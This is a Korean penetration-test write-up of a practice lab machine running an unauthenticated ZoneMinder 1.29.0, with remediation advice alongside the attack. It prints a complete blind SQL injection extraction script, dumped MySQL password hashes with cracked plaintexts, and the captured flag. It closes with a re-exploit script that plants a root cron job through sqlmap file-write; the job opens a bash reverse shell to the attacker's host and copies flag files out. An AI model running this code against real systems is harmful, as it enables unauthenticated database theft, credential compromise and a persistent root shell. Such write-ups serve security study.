---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/sqli
  - tech/db/mysql
type: machine
platform: pg
os: linux
ip: 192.168.248.52
ports: [21, 22, 80, 3305, 8080]
services: [ftp, http, http-proxy, odette-ftp, ssh]
status: solved
manual_tags: true
manual_cves: true
tech_count: 2
---

> [!info] 요약
> 타겟 `192.168.248.52` · Ubuntu 16.04 (Xenial) `[가정]` · Fundamental · **플래그 1/1 (`proof.txt`)**
> 진입점: 80·3305·8080 세 웹 포트가 공유하는 `/zm/` 에 **ZoneMinder 1.29.0** 이 `OPT_USE_AUTH` 꺼진 채 무인증 노출 → 로그 조회 엔드포인트의 `limit` 파라미터 **pre-auth SQLi**, 스택 쿼리(`;`)까지 성립 → 자작 `blind.py` 로 time-based blind 추출
> 권한상승: **해당 없음** — 셸을 얻지 않았고 `proof.txt` 를 `LOAD_FILE()` 로 직접 읽음. ⚠️ OSCP 시험이었다면 이 경로는 **0점**
> 시행착오·교훈 → [[_PLAYBOOK#A-11. 자동 도구가 뱉은 값이 의심스럽다]] · [[_PLAYBOOK#A-17. 부가 포트가 기본 페이지·403 만 뱉는다]] · [[_PLAYBOOK#B-12. SQLi 수동 UNION — sqlmap 금지 대비]] · [[_PLAYBOOK#B-1-10. ZoneMinder 무인증 콘솔 + Filter AutoExecuteCmd RCE]] · [[_PLAYBOOK#C-3. 플래그·증거]]

## Target #1 – 192.168.248.52

### Initial Access – 무인증 ZoneMinder 콘솔의 `limit` 파라미터 pre-auth 스택 쿼리 SQLi 로 DB 와 디스크 파일을 전량 열람

**Vulnerability Explanation:**
- ZoneMinder 1.29.0 이 `/zm/` 에 노출. `OPT_USE_AUTH` 가 꺼져 있어 로그인·세션 쿠키·CSRF 토큰 없이 `?view=` 화면과 조회 API 가 전부 열림
- 그 조회 경로의 `limit` 파라미터가 정수 검증 없이 SQL 에 문자열 연결됨. `LIMIT` 절 **뒤**라 따옴표를 탈출할 필요조차 없음 — 값 자체가 이미 SQL 문맥임. 문자열 리터럴 «안»에 끼어드는 SQLi([[Hawat]])와 갈리는 지점
- 백엔드가 다중문을 허용해 `;` 로 완전히 새 문장을 붙일 수 있음 → 독립한 `SELECT SLEEP()` 성립 = time-based blind 채널 확보
- DB 계정에 `FILE` 권한이 살아 있어 `LOAD_FILE()` 로 웹 루트 밖 파일(`config.php`·`/etc/crontab`·플래그)까지 읽힘

**Vulnerability Fix:**
- `limit` 을 `intval()` 로 강제하거나 정수 화이트리스트로 검증할 것. `LIMIT` 은 프리페어드 바인딩이 까다로워 캐스팅이 현실적
- `ZM_OPT_USE_AUTH=1` 로 인증 강제. 관리 콘솔을 무인증으로 노출하지 말 것
- 앱 계정(`zmuser`)에서 `FILE` 권한 회수, `secure_file_priv` 를 빈 값이 아닌 특정 디렉터리로 고정 → `LOAD_FILE`·`INTO OUTFILE` 차단
- 다중문 실행 함수(`mysqli_multi_query`) 사용 금지. 단일문 API 로 고정하면 세미콜론 주입의 파괴력이 급감
- `/zm/includes/` 디렉터리 리스팅 비활성(`Options -Indexes`) — 설정 파일 이름이 노출되면 `LOAD_FILE` 대상 경로를 그대로 알려주는 셈
- 스택 전면 교체 — Ubuntu 16.04 와 ZoneMinder 1.29.0 둘 다 EOL. 불필요한 vhost(3305·8080)와 프록시 메서드도 비활성해 공격 표면을 줄일 것

**Severity:** Critical — 무인증 원격에서 DB 전량 덤프 + 임의 파일 읽기. 코드 실행까지 가지는 않았음. `FILE` 권한 + 스택 쿼리 조합이면 `INTO DUMPFILE` UDF RCE 로 확장될 여지가 있으나 **`plugin_dir` 쓰기 가능 여부를 확인한 적이 없어 미검증** `[가정]`

**Steps to reproduce the attack:**
1. `-p-` 스캔 → 21·22·80·3305·8080 확인
2. 세 웹 포트를 각각 디렉터리 열거 → 셋 모두 `/zm/` 노출
3. `/zm/index.php` 가 로그인 없이 200 — ZoneMinder 1.29.0 무인증 확인
4. `POST /zm/index.php?view=request&request=log&task=query` 의 `limit` 에 `;SELECT SLEEP(5)#` → 응답 지연으로 스택 쿼리 확정
5. `blind.py` 로 `information_schema` · `zm.Users` · `mysql.user` 를 이진 탐색 추출
6. `LOAD_FILE()` 로 `config.php` 와 `proof.txt` 를 같은 채널로 읽음

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.248.52 | TCP: 21, 22, 80, 3305, 8080 |

```text
# Nmap 7.98 scan initiated Thu Aug 20 09:54:19 2026 as: /usr/lib/nmap/nmap -sCV -p- -Pn -A --min-rate 5000 -oN /home/kali/PG/Pebbles/nmap.log 192.168.248.52
Nmap scan report for 192.168.248.52
Host is up (0.084s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 aa:cf:5a:93:47:18:0e:7f:3d:6d:a5:af:f8:6a:a5:1e (RSA)
|   256 c7:63:6c:8a:b5:a7:6f:05:bf:d0:e3:90:b5:b8:96:58 (ECDSA)
|_  256 93:b2:6a:11:63:86:1b:5e:f5:89:58:52:89:7f:f3:42 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Pebbles
|_http-server-header: Apache/2.4.18 (Ubuntu)
3305/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
8080/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-favicon: Apache Tomcat
|_http-title: Tomcat
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|storage-misc
Running (JUST GUESSING): Linux 3.X|4.X|2.6.X (97%), Google Android 8.X (91%), Synology DiskStation Manager 7.X (88%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 cpe:/o:google:android:8 cpe:/o:linux:linux_kernel:2.6 cpe:/a:synology:diskstation_manager:7.1 cpe:/o:linux:linux_kernel:4.4
Aggressive OS guesses: Linux 3.10 - 4.11 (97%), Linux 3.13 - 4.4 (97%), Linux 3.2 - 4.14 (97%), Linux 3.8 - 3.16 (97%), Android 8 - 9 (Linux 3.18 - 4.4) (91%), Linux 2.6.32 - 3.13 (91%), Linux 4.4 (91%), Linux 2.6.32 - 3.10 (91%), Linux 3.11 - 4.9 (91%), Linux 3.13 or 4.2 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
— 출처: `~/PG/Pebbles/nmap.log`

**오탐 검증 — 저레이트 재스캔.** `--min-rate 5000` 은 빠른 대신 필터링된 포트를 놓치거나 열린 포트를 오탐할 수 있음. 같은 `-p-` 를 `-sS --min-rate 500 --max-retries 3` 으로 다시 돌려 포트 목록을 교차 검증함.

```text
# Nmap 7.98 scan initiated Thu Aug 20 09:55:20 2026 as: /usr/lib/nmap/nmap -sS -p- -Pn --min-rate 500 --max-retries 3 -oN /home/kali/PG/Pebbles/nmap_lowrate_allports.log 192.168.248.52
Nmap scan report for 192.168.248.52
Host is up (0.084s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
80/tcp   open  http
3305/tcp open  odette-ftp
8080/tcp open  http-proxy
```
— 출처: `~/PG/Pebbles/nmap_lowrate_allports.log`

같은 5개 포트가 그대로 나옴 → 빠른 스캔에 오탐 없음. 포트 목록이 이후 모든 판단의 뿌리이므로 한 번은 확인하고 감. 저레이트 쪽의 `odette-ftp`·`http-proxy` 는 **식별 결과가 아니라 `nmap-services` 의 포트번호 사전 항목**임 — `-sCV` 쪽이 셋 다 `Apache httpd 2.4.18` 로 확정함([[_PLAYBOOK#A-11. 자동 도구가 뱉은 값이 의심스럽다]]).

**OS 판정.** `OpenSSH 7.2p2 Ubuntu 4ubuntu2.8` + `Apache 2.4.18 (Ubuntu)` 는 Ubuntu 16.04(Xenial) 의 표준 패키지 조합임. ⚠️ 다만 **두 배너가 같은 nmap 출처 하나에서 나왔으므로 「독립 근거 2개」 요건은 미충족** — 셸을 못 잡아 `/etc/os-release`·`uname -a` 로 확인한 기록이 없음. Xenial 판정은 `[가정]`.

**FTP.** `vsftpd 3.0.3` — 백도어 버전(2.3.4)이 아님. 익명 로그인은 `530 Login incorrect` 로 거부됨(관측 기록 미보존 — 산출물에 세션 로그 없음, `[가정]`). 여기서 접음.

**SSH.** `OpenSSH 7.2p2` 는 사용자명 열거 CVE-2016-6210 영향 범위이나, 자격증명이 없는 상태에서 소득이 적어 시도하지 않음. **배제가 아니라 미시도임.** (이 번호는 반증·배제 서술이므로 `cves` 에 넣지 않음 — `manual_cves: true`.)

**디렉터리 열거 — 포트별.**

```text
/index.php            (Status: 200) [Size: 1134]
/images               (Status: 301) [Size: 317] [--> http://192.168.248.52/images/]
/css                  (Status: 301) [Size: 314] [--> http://192.168.248.52/css/]
/javascript           (Status: 301) [Size: 321] [--> http://192.168.248.52/javascript/]
/zm                   (Status: 301) [Size: 313] [--> http://192.168.248.52/zm/]
```
— 출처: `~/PG/Pebbles/gob_80.txt`

```text
/index.html           (Status: 200) [Size: 11321]
/javascript           (Status: 301) [Size: 328] [--> http://192.168.248.52:3305/javascript/]
/zm                   (Status: 301) [Size: 320] [--> http://192.168.248.52:3305/zm/]
```
— 출처: `~/PG/Pebbles/gob_3305.txt`

```text
/index.php            (Status: 200) [Size: 11074]
/javascript           (Status: 301) [Size: 328] [--> http://192.168.248.52:8080/javascript/]
/hello.php            (Status: 200) [Size: 486]
/zm                   (Status: 301) [Size: 320] [--> http://192.168.248.52:8080/zm/]
```
— 출처: `~/PG/Pebbles/gob_8080.txt`

**세 포트가 공유하는 것은 `/zm/` 와 `/javascript/` 둘뿐임.** 문서 루트 자체는 서로 다름 — 80 은 `index.php` 1134B + `/images`·`/css`, 3305 는 Apache 기본 `index.html` 11321B, 8080 은 `index.php` 11074B + `/hello.php`. `/zm` 과 `/javascript` 는 데비안/우분투 패키지가 심는 **전역 Apache `Alias`**(zoneminder·javascript-common)라 vhost 와 무관하게 세 포트 전부에 뜸 `[가정]`.

⚠️ 그러므로 **「세 포트가 같은 문서 루트」로 뭉뚱그리면 안 됨.** 실제로 8080 열거만이 `/hello.php` 를 찾았고 그것이 아래 8080 정체 판정의 재료가 됨 — 포트별 열거를 「중복 노동」으로 잘라냈다면 그 파일을 못 봤음([[_PLAYBOOK#A-17. 부가 포트가 기본 페이지·403 만 뱉는다]]).

**8080 은 Tomcat 이 아님.** nmap 이 `http-favicon: Apache Tomcat` · `http-title: Tomcat` 을 보고했으나 서버 헤더는 `Apache/2.4.18 (Ubuntu)` 임. 여기에 `http-open-proxy: Potentially OPEN proxy` 까지 겹쳐 「Tomcat 매니저 → WAR 배포」 반사가 발동하기 쉬운 배치임. `/manager/html`·`/index.jsp` 404 와 `/hello.php` 가 JSP 원문을 그대로 뱉었다는 서술이 원 기록에 있으나 **응답 본문 산출물이 남아 있지 않아 재확인 불가** — `[가정]`. 산출물로 확정되는 것은 세 포트의 서버 헤더가 전부 Apache 라는 것까지임.

**`/zm/` 내부.**

```text
/images               (Status: 301) [Size: 320] [--> http://192.168.248.52/zm/images/]
/index.php            (Status: 200) [Size: 6785]
/cgi-bin              (Status: 301) [Size: 321] [--> http://192.168.248.52/zm/cgi-bin/]
/events               (Status: 301) [Size: 320] [--> http://192.168.248.52/zm/events/]
/tools                (Status: 301) [Size: 319] [--> http://192.168.248.52/zm/tools/]
/graphics             (Status: 301) [Size: 322] [--> http://192.168.248.52/zm/graphics/]
/skins                (Status: 301) [Size: 319] [--> http://192.168.248.52/zm/skins/]
/css                  (Status: 301) [Size: 317] [--> http://192.168.248.52/zm/css/]
/ajax                 (Status: 301) [Size: 318] [--> http://192.168.248.52/zm/ajax/]
/includes             (Status: 301) [Size: 322] [--> http://192.168.248.52/zm/includes/]
/js                   (Status: 301) [Size: 316] [--> http://192.168.248.52/zm/js/]
/api                  (Status: 301) [Size: 317] [--> http://192.168.248.52/zm/api/]
/lang                 (Status: 301) [Size: 318] [--> http://192.168.248.52/zm/lang/]
/temp                 (Status: 301) [Size: 318] [--> http://192.168.248.52/zm/temp/]
/views                (Status: 301) [Size: 319] [--> http://192.168.248.52/zm/views/]
```
— 출처: `~/PG/Pebbles/gob_zm.txt`

`skins`·`views`·`ajax`·`api`·`includes` 조합이 ZoneMinder 의 전형적 트리임. 진입점은 `index.php` 하나고 `?view=` 로 화면(console·events·filter·log…)을 라우팅함.

**버전 판정 — 근거 1개뿐임(요건 미충족).**

- ZoneMinder **1.29.0** — 콘솔 페이지 푸터 문자열 관측. ⚠️ **응답 본문을 담은 산출물이 없어 원문 재확인 불가**
- 두 번째 독립 근거로 `/zm/api/host/getVersion.json`(ZM 이 버전을 노출하는 API) 을 쓸 수 있었으나 **호출 기록이 없음 — 관측 없음.** `/zm/api/` 디렉터리가 존재한다는 것까지만 산출물로 확인됨

**무인증 확인 — 이쪽은 산출물이 증명함.** `blind.py` 는 로그인 절차·쿠키 병·CSRF 토큰이 **하나도 없이** `POST /zm/index.php?view=request&request=log&task=query` 만 반복하는데, 그것으로 DB 를 통째로 뽑아냄. 스크립트 자체가 곧 pre-auth 증거임.

원 기록에는 `var canEditSystem = true;`(로그인 없이도 시스템 편집 권한이 참으로 내려옴)를 확인했다는 서술도 있으나 **응답 산출물이 없어 재확인 불가** — `[가정]`.

> [!danger] 로그인 폼이 보여도 「인증이 있다」는 뜻이 아님
> ZoneMinder 는 인증을 옵션으로 끌 수 있음(`OPT_USE_AUTH`). UI 에 로그인 링크가 있어도 view·API 가 세션을 요구하지 않으면 그냥 들어감. 관리 앱을 만나면 **로그인 없이 내부 view 를 직접 curl** 하는 것이 첫 수임. 200 이 떨어지고 데이터가 보이면 인증은 장식임. 자매 박스 [[Cobbles]](1.34.23)도 같은 조건이었음.

### Initial Access – ZoneMinder `limit` SQLi → time-based blind

> [!danger] ⚠️ 시험 금지 도구 — sqlmap / Metasploit UDF 모듈
> 랩 브리핑은 sqlmap(`--os-shell`) 또는 MySQL UDF(`lib_mysqludf_sys` 의 `sys_exec`)로 셸을 얻으라고 안내함. **sqlmap 은 OSCP 전면 금지**이고 Metasploit 은 1대 한정임.
> 아래는 **자작 파이썬 스크립트만으로** 같은 결과를 얻는 절차임. 수동 UNION 절차·엔진 지문은 [[_PLAYBOOK#B-12. SQLi 수동 UNION — sqlmap 금지 대비]].

**주입 지점.** `POST /zm/index.php` 의 `limit`. ZoneMinder 의 이벤트/로그 조회가 이런 SQL 을 만듦:

```php
// 개념도 — 실제 소스는 타겟 디스크의 /zm/includes 안에 있고 원문을 확보하지 못함 [가정]
$sql = "SELECT ... FROM Events WHERE ... ORDER BY ... LIMIT " . $_REQUEST['limit'];
$result = mysqli_query($conn, $sql);      // ← limit 이 정수 검증 없이 직접 연결
```

같은 `limit` 이 세 경로에 노출됨 — `view=events`(hidden 필드), `view=filter`(사용자 입력), `view=request&request=log&task=query`(로그 조회 API). **셋 중 로그 조회 API 를 골랐음** — 받는 파라미터가 `limit` 하나뿐이고 부수효과(이벤트 생성 등)가 없어 수백 요청을 반복해도 안전함. blind 는 요청 수가 수백~수천이라 **가장 단순하고 조용한 read-only 엔드포인트**를 고르는 것이 정답임.

**탐지 — 시간이 정말 채널인지.** `limit=100` 기준선과 `limit=100;SELECT SLEEP(5)#` 를 각각 던져 `%{time_total}` 을 비교, 약 0.09초 → 약 5.1초로 갈렸음. ⚠️ **이 두 측정의 원문 로그는 산출물에 없음** — `[가정]`. 다만 스택 쿼리가 성립한다는 사실 자체는 `blind.py` 의 페이로드가 `1;SELECT IF(…)#` 형태이고 그것으로 실제 데이터가 나왔다는 것으로 **독립 확정됨**.

**왜 time-based 인가.** 채널을 넷으로 나눠 판정하면:

| 채널 | 이 박스에서 | 왜 |
|---|---|---|
| UNION | ✗ | `limit` 은 이미 완성된 SELECT 의 **꼬리**(`LIMIT` 절 뒤)라 컬럼 수를 맞춰 끼우기가 문맥상 까다로움 |
| 에러 기반 | ✗ | 에러가 응답에 렌더되지 않음 |
| Boolean | △ | 로그 조회 응답이 주입 유무로 유의미하게 안 바뀜 → 판정 기준을 못 잡음 |
| Time | ✓ | `;SELECT SLEEP()` 스택이 성립 → 지연이 깨끗하게 관측됨 |

일반적으로는 **UNION → 에러 → Boolean → time** 순으로 내려가고 time 은 최후 수단임(요청마다 실제로 기다려야 해서 느림). 이 박스는 스택 쿼리 덕에 time 이 오히려 가장 안정적이었음.

**페이로드 조각.**

```text
1;SELECT IF((<조건>),SLEEP(0.6),0)#
```

| 조각 | 역할 |
|---|---|
| `1` | 원래 `limit` 값. 앞 문장을 문법적으로 온전하게 유지 |
| `;` | 문장 종료 — 여기서 스택 쿼리가 시작됨 |
| `SELECT IF((조건),SLEEP(0.6),0)` | 조건이 참이면 0.6초 자고, 거짓이면 0 을 반환하고 끝 |
| `#` | MySQL 주석. 뒤에 남는 원래 쿼리 잔여물을 무력화 |

`<조건>` 에 `ASCII(SUBSTRING((SELECT …),i,1))>N` 을 넣으면 **응답이 느렸는지 여부가 그 비교의 참/거짓**이 됨. 이걸 이진 탐색으로 돌리면 한 글자가 나옴.

**`blind.py` 전문** — 엔드포인트와 주입 위치만 바꾸면 어느 blind SQLi 에도 재사용됨.

```python
#!/usr/bin/env python3
import sys, time, requests
T="http://192.168.248.52/zm/index.php?view=request&request=log&task=query"
S=requests.Session()
DELAY=0.6
def truth(cond):
    p="1;SELECT IF((%s),SLEEP(%s),0)#" % (cond, DELAY)
    t=time.time(); S.post(T, data={"limit":p}, timeout=30)
    return (time.time()-t) > 0.40
def int_val(expr, lo, hi):
    while lo<hi:
        mid=(lo+hi)//2
        if truth("(%s)>%d"%(expr,mid)): lo=mid+1
        else: hi=mid
    return lo
def extract(expr):
    L=int_val("LENGTH(%s)"%expr,0,4096)
    out=""
    for i in range(1,L+1):
        c=int_val("ASCII(SUBSTRING((%s),%d,1))"%(expr,i),0,127)
        out+=chr(c); sys.stdout.write(chr(c)); sys.stdout.flush()
    print(); return out
if __name__=="__main__":
    what=sys.argv[1]
    sys.stderr.write("[*] len... "); 
    v=extract(what)
    print("[+] RESULT: %r"%v)
```
— 출처: `~/PG/Pebbles/blind.py`

**코드 해설.**

- `S=requests.Session()` — TCP 연결 재사용. 수백~수천 요청을 던지므로 핸드셰이크 비용 절감이 속도에 크게 기여함
- `truth(cond)` — 조건 하나를 1비트로 판정. 경과 시간이 **0.40초를 넘으면 참**. 임계값 0.40 은 기준선(약 0.09초)과 `SLEEP(0.6)` 의 중간이라 네트워크 지터가 있어도 갈림
- `int_val(expr, lo, hi)` — 이진 탐색. 매 반복마다 `(expr)>mid` 를 물어 범위를 절반으로 접음. 종료 시 `lo` 가 값임
- `extract(expr)` — ① `LENGTH(expr)` 를 먼저 이진 탐색으로 확정하고 ② 1..L 각 위치의 `ASCII(SUBSTRING(...))` 를 이진 탐색으로 구해 조립
- `sys.argv[1]` — 추출할 SQL 식을 명령줄로 받음. 스크립트를 고치지 않고 대상만 바꿈

**길이를 먼저 구하는 이유.** `SUBSTRING` 은 범위를 넘어가면 빈 문자를 돌려주는데, 길이를 모르면 「언제 끝났는지」 기준이 없음. 「ASCII 가 0 이면 종료」로 짜도 되나 진짜 데이터에 제어문자가 섞이면 조기 종료 오류가 남. **길이를 먼저 못 박는 편이 견고함**(`int_val(..., 0, 4096)` = 최대 12회).

**요청 수.** 문자당 `log2(128)=7`회, 길이 12회. 32자 플래그면 `12 + 32×7 = 236`회. 선형 탐색이면 평균 64회/문자로 2048회 — 9배 차이임. **blind 를 손으로 짤 때 이진 탐색이 「감당 가능/불가능」을 가름.**

실측 상한(파일 mtime): 직전 산출물 `mysqlroot.hash` 10:22:33 → `proof.out` 10:25:06 = **2분 33초 안에 32자 추출 완료.** 5줄 200자 규모인 `mysqluser.out` 은 10:25:06 → 10:30:34 = 5분 28초.

**추출 결과.**

```text
information_schema
mysql
performance_schema
sys
zm[*] len... 
[+] RESULT: 'information_schema\nmysql\nperformance_schema\nsys\nzm'
```
— 출처: `~/PG/Pebbles/dbs.out` (`SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata`)

```text
admin:*4ACFE3202A5FF5CF467898FC58AAB1D615029441[*] len... 
[+] RESULT: 'admin:*4ACFE3202A5FF5CF467898FC58AAB1D615029441'
```
— 출처: `~/PG/Pebbles/zmusers.out` (`zm.Users`)

```text
root:*D11862AF9458F6F9B9C584C4606CFF81BA0DD442
mysql.session:*THISISNOTAVALIDPASSWORDTHATCAPBEUSEDHERE
mysql.sys:*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
debian-sys-maint:*818BD5A8C5DD77E81FBB077415EA3BCE42B597CA
zmuser:*C1D2D6FC5C596AFB19FFC4331DF6DAA287749A3E[*] len... 
```
— 출처: `~/PG/Pebbles/mysqluser.out` (`mysql.user` · 위 다섯 줄을 한 줄로 되풀이하는 마지막 `[+] RESULT:` 행은 생략함)

**해시 판정.** `*` 로 시작하는 41자 16진은 MySQL `PASSWORD()` 형식 = `SHA1(SHA1_binary(pw))`. 로컬에서 후보를 직접 계산해 대조함:

| 계정 | 해시 | 평문 |
|---|---|---|
| ZoneMinder `admin` | `*4ACFE3202A5FF5CF467898FC58AAB1D615029441` | **`admin`** |
| MySQL `zmuser` | `*C1D2D6FC5C596AFB19FFC4331DF6DAA287749A3E` | **`zmpass`** |
| MySQL `root` | `*D11862AF9458F6F9B9C584C4606CFF81BA0DD442` | 미크랙 |
| `debian-sys-maint` | `*818BD5A8C5DD77E81FBB077415EA3BCE42B597CA` | 미크랙 |

`root`·`debian-sys-maint` 는 rockyou 14,344,392줄 완주에도 안 깨짐. `zmuser` 해시가 `zmpass` 로 풀린 것은 아래 `config.php` 원문과 **독립적으로 일치**해 서로를 검증함.

**설정 파일 — 디렉터리 리스팅으로는 못 읽음.** `/zm/includes/` 에 `config.php` 파일명은 노출되나 `.php` 는 서버에서 실행되므로 브라우저로는 빈 결과만 옴. 소스를 보려면 `.phps`·PHP 필터 LFI·**`LOAD_FILE`(SQLi 경유)** 같은 우회가 필요함. 여기서는 SQLi 가 이미 있었으므로 `LOAD_FILE` 로 디스크에서 직접 읽음:

```text
login' => 'zmuser',
		'password' => 'zmpass',
		'database' => 'z
```
— 출처: `~/PG/Pebbles/dbphp.out` (64바이트에서 **중단됨** — 아래 참조)

**플래그 추출.**

```text
c3d4b2020d3ff9d4eefa8e6f89e6e67b
[*] len... 
[+] RESULT: 'c3d4b2020d3ff9d4eefa8e6f89e6e67b\n'
```
— 출처: `~/PG/Pebbles/proof.out` (`SELECT LOAD_FILE('<proof.txt 경로>')`)

⚠️ `blind.py` 는 argv 를 기록하지 않으므로 **정확히 어느 경로를 읽었는지는 산출물에 없음.** `/root/proof.txt` 는 `[가정]` — 다만 같은 날 작성된 `pebbles_pwn.sh` 가 `/root/proof.txt` 와 `/home/sally/local.txt` 를 대상으로 적고 있어 그 경로를 알고 있었던 것으로 보임.

> [!warning] `LOAD_FILE` 가 되려면 세 조건이 맞아야 함
> ① DB 계정에 **`FILE` 권한**, ② 대상 파일이 **mysqld 가 읽을 수 있는 권한**, ③ **`secure_file_priv`** 가 비어 있거나 그 경로를 허용. 셋 중 하나라도 막히면 `LOAD_FILE` 은 에러가 아니라 **NULL** 을 조용히 반환함 — 빈 값이라 「주입이 실패했나」로 오독하기 쉬움. 이 박스는 셋 다 열려 있었음.

**긴 파일 추출은 실용적이지 않음 — 산출물 4개가 중단된 채로 남음.**

| 파일 | 크기 | `[+] RESULT:` | 판정 |
|---|---|---|---|
| `dbs.out` · `zmusers.out` · `mysqluser.out` · `proof.out` | — | 있음 | 완주 |
| `tables.out` (10:10) · `crontab.out` (10:35) · `crontail.out` (10:39) · `dbphp.out` (10:43) | 30·30·62·64B | **없음** | 중단 |

`blind.py` 는 완주 시 반드시 `[+] RESULT:` 를 찍음. 그 줄이 없는 넷은 **추출 도중 끊긴 것**임. `crontab.out` 은 직전 산출물(10:30:34)부터 5분 21초를 태우고 30바이트(`# /etc/crontab: system-wide cr`)에서 끊겼음 — 문자당 약 10.7초. 수백 바이트짜리 텍스트 파일을 time-based 로 통째로 뽑는 것은 시간 대비 소득이 없음.

```text
# /etc/crontab: system-wide cr
```
— 출처: `~/PG/Pebbles/crontab.out` (중단)

```text
ot    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	r
```
— 출처: `~/PG/Pebbles/crontail.out` (중단 · `SUBSTRING` 오프셋을 줘 파일 뒷부분만 읽은 흔적)

⚠️ 그러므로 **「크론에 특이사항이 없었다」고 적으면 안 됨** — 표준 데비안 헤더 30자와 꼬리 62자만 봤을 뿐 `/etc/crontab` 전체를 읽은 적이 없음. `/etc/cron.d/`·`/etc/cron.*` 는 아예 시도하지 않음. **배제가 아니라 미완임.**

```text
zm.Config
zm.ControlPresets
zm
```
— 출처: `~/PG/Pebbles/tables.out` (중단 — `zm` DB 테이블 목록의 앞 세 줄)

**Local.txt value:** **없음.**
근거 — ① `_STATUS` 판정이 **1/1**(플래그 슬롯 1개) ② `~/PG/Pebbles/` 전량 22개 파일 중 플래그 값을 담은 것은 `proof.out` 하나뿐 ③ `pebbles_pwn.sh` 가 `/home/sally/local.txt` 회수를 «계획»했으나 그 스크립트는 실행된 적이 없음(아래 `Privilege Escalation` 절). 즉 user 플래그는 **존재 여부 자체가 미확인**이지 「못 찾은 것」이 아님.

### Privilege Escalation – 없음 (셸 미획득 — 플래그를 DB 경유로 읽음)

**Vulnerability Explanation:** 권한상승 취약점을 확정하지 못함. 애초에 OS 셸을 얻지 않았고, 목표 파일(`proof.txt`)을 `LOAD_FILE()` 한 번으로 읽어 권한상승 단계로 들어가지 않음.

**Vulnerability Fix:** 해당 없음(취약점 미확정). 다만 아래 UDF 경로를 막는 조치는 `Initial Access` 의 `Vulnerability Fix:` 와 같음 — `FILE` 권한 회수 · `secure_file_priv` 고정 · mysqld 를 비특권 계정으로 구동.

**Severity:** 해당 없음

**Steps to reproduce the attack:** 해당 없음 — 셸 미획득. 아래는 **시도하지 않은** 경로의 기록임

**있었던 경로 — MySQL UDF (미시도).** 스택 쿼리 + `FILE` 권한이 있으면 UDF 가 표준 경로임:

1. `lib_mysqludf_sys.so` 를 `INTO DUMPFILE` 로 `plugin_dir` 에 씀(hex 리터럴로 바이너리 주입 — [[Squid]] 패턴)
2. `CREATE FUNCTION sys_exec RETURNS INT SONAME 'lib_mysqludf_sys.so';`
3. `SELECT sys_exec('id > /tmp/o');` — **mysqld 를 구동하는 사용자** 권한으로 실행

랩 브리핑이 안내하는 길이 이것임. 시작하지 않은 이유 — 필요한 산출물이 `proof.txt` 하나였고 그건 `LOAD_FILE` 한 번으로 읽힘. UDF 는 (a) `.so` 아키텍처 정합 (b) `plugin_dir` 위치 확인 (c) `INTO DUMPFILE` 권한 등 실패 지점이 많음.

⚠️ **다만 이 판단은 시험 기준으로는 틀림** — OSCP 는 플래그 값이 아니라 **대화형 셸에서 원위치 `cat` 한 증거**를 요구함(`Post-Exploitation` 절). 「파일 하나가 목표면 최단 경로」와 「점수가 되는 경로」는 다름.

**셸 확보를 뒤늦게 시도한 흔적 둘 — 둘 다 미완.**

- **SSH 키쌍 생성 (10:57:42).** `~/PG/Pebbles/peb_key`(0600, 399B) · `peb_key.pub`(91B, `ssh-ed25519 … kali@kali`). `INTO OUTFILE` 로 타겟의 `authorized_keys` 에 심어 SSH 로 붙으려던 것으로 보임 `[가정]`. ⚠️ **타겟에 실제로 썼다는 산출물이 없고 SSH 세션 기록도 없음** — 키를 심었는지 여부는 **확인 불가**
- **재침투 스크립트 초안 (11:09:43).** `pebbles_pwn.sh` — 첫 줄 주석이 `# One-shot re-exploit for Pebbles once the box is back up.` 임. 즉 **작성 시점에 박스가 이미 정지돼 있었고 실행된 적이 없음.** 키 경로 대신 `/etc/cron.d/pebbles` 를 심어 크론이 root 로 플래그를 mysql 읽기 가능 디렉터리에 복사하게 하고, 그것을 다시 `LOAD_FILE` 로 회수하는 계획임

```bash
#!/bin/bash
# One-shot re-exploit for Pebbles once the box is back up.
T=192.168.248.52; LHOST=192.168.45.207
# cron: copy flags into mysql-readable dir (retrieve via LOAD_FILE, no net needed) + record cron uid + revshell on 80
cat > /tmp/pebcron <<CRON
* * * * * root id > /var/lib/mysql/cronid.txt 2>&1; cp /home/sally/local.txt /var/lib/mysql/l.txt 2>/dev/null; cp /root/proof.txt /var/lib/mysql/p.txt 2>/dev/null; chmod 644 /var/lib/mysql/cronid.txt /var/lib/mysql/l.txt /var/lib/mysql/p.txt 2>/dev/null
* * * * * root bash -c "bash -i >& /dev/tcp/$LHOST/80 0>&1"

CRON
sqlmap -u "http://$T/zm/index.php?view=request&request=log&task=query" --data="limit=1" -p limit --dbms=mysql --technique=S --batch --file-write=/tmp/pebcron --file-dest=/etc/cron.d/pebbles 2>&1 | grep -iE "same size|written"
echo "[*] cron planted. waiting 130s for cron to fire..."; sleep 130
h(){ python3 -c "import sys;print(0x.join([]))" 2>/dev/null; }
# retrieve via blind LOAD_FILE
echo "[*] cron uid:"; python3 blind.py "(SELECT LOAD_FILE(0x2f7661722f6c69622f6d7973716c2f63726f6e69642e747874))"
echo "[*] local.txt:"; python3 blind.py "(SELECT LOAD_FILE(0x2f7661722f6c69622f6d7973716c2f6c2e747874))"
